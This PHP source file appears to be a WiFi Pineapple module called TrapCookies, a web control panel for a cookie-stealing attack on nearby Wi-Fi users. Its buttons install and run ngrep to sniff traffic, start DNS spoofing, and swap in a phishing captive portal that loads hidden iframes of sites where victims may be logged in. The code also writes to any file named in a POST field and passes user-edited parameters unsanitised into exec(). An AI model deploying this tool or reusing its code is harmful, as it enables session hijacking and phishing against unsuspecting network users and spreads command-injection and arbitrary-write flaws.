<html><head>
<?php
$module_name = "TrapCookies";
$module_path = "/www/pineapple/modules/trapcookies/";
$module_version = "0.1";
?>
<title>Pineapple Control Center - <?php echo $module_name." [v".$module_version."]"; ?></title>
<script  type="text/javascript" src="jquery.min.js"></script>
</head>
<body bgcolor="black" text="white" alink="green" vlink="green" link="green">

<?php require('/www/pineapple/includes/navbar.php'); ?>

<pre>

<?php
$filename =$_POST['filename'];
$newdata = $_POST['newdata'];

if ($newdata != "") { $newdata = ereg_replace(13,  "", $newdata);
 $fw = fopen($filename, 'w') or die('Could not open file!');
 $fb = fwrite($fw,stripslashes($newdata)) or die('Could not write to file');
 fclose($fw);
 echo "Updated " . $filename . "<br /><br />";
} ?>

<?php
if(isset($_GET[installNGREP])){
	exec("opkg update");
	echo "Updated opkg<br>";
	exec("opkg install ngrep");
	echo "Installed ngrep<br><br>";
}
if(isset($_GET[removeNGREP])){
        exec("opkg remove ngrep");
        echo "Removed ngrep<br><br>";
}

if(isset($_GET[startDNSSPOOF])){
	echo "Running dnsspoof<br><br>";
	exec("echo '' > /www/pineapple/logs/dnsspoof.log");
	exec("echo /www/pineapple/dnsspoof/dnsspoof.sh | at now");
}
if(isset($_GET[stopDNSSPOOF])){
	echo "Running: killall dnsspoof<br><br>";
	exec("killall dnsspoof");
}
if(isset($_GET[runNGREP])){
  $filename = "ngrep.params";
  $fh = fopen($filename, "r") or die("Could not open file!");
  $data = fread($fh, filesize($filename)) or die("Could not read file!");
  fclose($fh);
	echo "Running: ngrep $data";
	exec("ngrep $data &");
	echo "<br>";
}
if(isset($_GET[stopNGREP])){
        echo "Running: killall ngrep<br><br>";
        exec("killall ngrep");
}
if(isset($_GET[installMODULE])){
		exec("cp /www/index.php /www/index.php.backup");
		echo "Backed up current index.php. <br /><br />";
		exec("cp index.php.pharm /www/index.php");
                echo "Replaced current index.php with pharmed iframes. <br /><br />";
		exec("cp /www/pineapple/config/spoofhost /www/pineapple/config/spoofhost.backup");
                echo "Backed up current spoofhost file. <br /><br />";
                exec("cp spoofhost.pharm /www/pineapple/config/spoofhost");
                echo "Replaced current spoofhost with pharmed subdomains. <br /><br />";
}
if(isset($_GET[removeMODULE])){
                exec("cp /www/index.php.backup /www/index.php");
                echo "Replaced current index.php with backup. <br /><br />";
		exec("cp /www/pineapple/config/spoofhost.backup /www/pineapple/config/spoofhost");
                echo "Replaced current spoofhost with backup. <br /><br />";
		exec("rm /www/index.php.backup");
		echo "Removed index.php.backup<br><br>";
}

?>
<table border="0" width="100%">
<tr><td>
<?php

$is_backup = file_exists("/www/index.php.backup") ? 1 : 0;
$is_ngrep = file_exists("/usr/bin/ngrep") ? 1 : 0;

echo "Ngrep  ";
if($is_ngrep)
{
        echo "&nbsp;<span id=\"ngrep_status\"><font color=\"lime\"><strong>installed</strong></font></span>";
	echo " | <a href=\"trapcookies.php?removeNGREP\">Remove</a>";
}
else
{
        echo "&nbsp;<span id=\"ngrep_status\"><font color=\"red\"><strong>not installed</strong></font></span>";
	echo " | <a href=\"trapcookies.php?installNGREP\">Install</a>";
}

echo "<br><br>Log  ";
if($is_ngrep)
{
        echo "&nbsp;<span id=\"ngrep_status\"><font color=\"lime\"><strong>ready</strong></font></span>";
	$is_greping = exec("ps auxww | grep ngrep | grep -v -e \"grep ngrep\" | awk '{print $1}'");
	if($is_greping){
		echo " | <font color=\"lime\"><strong>ACTIVE</strong></font></span>";
		echo " | <a href=\"trapcookies.php?stopNGREP\">Stop</a> | <a href=\"logs.php\"><b>VIEW LOG</b></a><br><br>";
	} else {
		echo " | <font color=\"red\"><strong>Stoped</strong></font></span>";
		echo " | <a href=\"trapcookies.php?runNGREP\">Start</a> | <a href=\"logs.php\"><b>VIEW LOG</b></a><br><br>";
	}
}
else
{
        echo "&nbsp;<span id=\"ngrep_status\"><font color=\"red\"><strong>unavilable</strong></font></span>";
	echo " | Requires Ngrep<br><br>";
}

echo "Landing page with frames  ";
if($is_backup)
{
        echo "&nbsp;<span id=\"ngrep_status\"><font color=\"lime\"><strong>installed</strong></font></span>";
	echo " | <a href=\"trapcookies.php?removeMODULE\">Remove</a> | <a href=\"#spoofhost\"><b>Edit</b></a>";
}
else
{
        echo "&nbsp;<span id=\"ngrep_status\"><font color=\"red\"><strong>not installed</strong></font></span>";
	echo " | <a href=\"trapcookies.php?installMODULE\">Install</a>";
}

$isdnsspoofup = exec("ps auxww | grep dnsspoof.sh | grep -v -e grep");
if ($isdnsspoofup != "") {
echo "<br><br> DNS Spoof *  <font color=\"lime\"><b>enabled</b></font>&nbsp; | <a href=\"trapcookies.php?stopDNSSPOOF\"><b>Stop</b></a>";
} else { echo "<br><br> DNS Spoof *  <font color=\"red\"><b>disabled</b></font> | <a href=\"trapcookies.php?startDNSSPOOF\"><b>Start</b></a>"; }
?>

<?php
if($is_ngrep){
$filename = "ngrep.params";
  $fh = fopen($filename, "r") or die("Could not open file!");
  $data = fread($fh, filesize($filename)) or die("Could not read file!");
  fclose($fh);
 echo "<br><br><a name='ngrep'><b>Ngrep params</b>
<form action='$_SERVER[php_self]' method= 'post' >
<textarea name='newdata' cols='80' rows='1' style='background-color:black; color:white; border-style:dashed;'>$data</textarea>
<input type='hidden' name='filename' value='ngrep.params'>
<br><input type='submit' value='Update Ngrep params'>
</form>
</td></tr>
<tr><td>";
}
 ?>

<?php
if($is_ngrep && $is_backup){

}
?>

<?php
if($is_backup){
$filename = "/www/index.php";
  $fh = fopen($filename, "r") or die("Could not open file!");
  $data = fread($fh, filesize($filename)) or die("Could not read file!");
  fclose($fh);
 echo "<a name='spoofhost'><b>Landing Page (phishing)</b>
<form action='$_SERVER[php_self]' method= 'post' >
<textarea name='newdata' cols='80' rows='20' style='background-color:black; color:white; border-style:dashed;'>$data</textarea>
<input type='hidden' name='filename' value='/www/index.php'>
<br><input type='submit' value='Update Landing Page'>
</form>
</td><td valign='top' align='left'>
Captive portal that opens hidden iframes of sites that user might be logged in.
</td></tr>
<tr><td>";
}
?>

<?php
if($is_backup){
$filename = "/www/pineapple/config/spoofhost";
  $fh = fopen($filename, "r") or die("Could not open file!");
  $data = fread($fh, filesize($filename)) or die("Could not read file!");
  fclose($fh);
 echo "<a name='spoofhost'><b>DNS Spoof Host</b>
<form action='$_SERVER[php_self]' method= 'post' >
<textarea name='newdata' cols='80' rows='4' style='background-color:black; color:white; border-style:dashed;'>$data</textarea>
<input type='hidden' name='filename' value='/www/pineapple/config/spoofhost'>
<br><input type='submit' value='Update Spoofhost'>
</form>
</td><td valign='top' align='left'>
Specifies new destination IP for source Domain.
</td>
</table>";
}
?>
</pre>
</body>
</html>
